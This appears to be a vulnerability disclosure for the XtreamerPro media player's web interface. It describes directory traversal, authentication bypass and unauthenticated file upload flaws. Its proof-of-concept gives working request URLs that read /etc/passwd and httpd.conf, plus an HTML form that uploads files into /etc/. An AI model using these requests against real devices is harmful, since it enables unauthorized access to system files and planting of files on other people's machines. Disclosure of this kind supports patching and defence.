Summary
================

XtreamerPro is a popular media-player and streamer with
an optional web interface management.



Description
================

XtreamerPro suffers from a directory traversal with
appending the '/' character in the HTTP GET method of the
affected host address. XtreamerPro also prone to an
authentication bypass vulnerability. This vulnerability
can be exploited by remote attackers to access sensitive
data on the server without being authenticated. The attacker
can also upload files to any location on the server, without
being authenticated, using a multipart/form-data post.




Proof of Concept
================

directory traversal:

http://192.168.2.100/otherlist.php?dir=/%2f../%2f../etc/passwd
http://192.168.2.100/otherlist.php?dir=/%2f../%2f../etc/httpd.conf




Authentication bypass:

http://192.168.2.100/download.php?dir=/%2f../%2f../etc/&file=passwd
http://192.168.2.100/download.php?dir=/%2f../%2f../etc/&file=httpd.conf



Authentication bypass - upload file:

<form id="form1" name="write_form" action="http://192.168.2.100/upload_file.php?dir=/%2f../%2f../etc/" method="post" enctype="multipart/form-data">
	<INPUT TYPE=FILE name="Filedata" id="Filedata">
	<input type=submit>
</form>
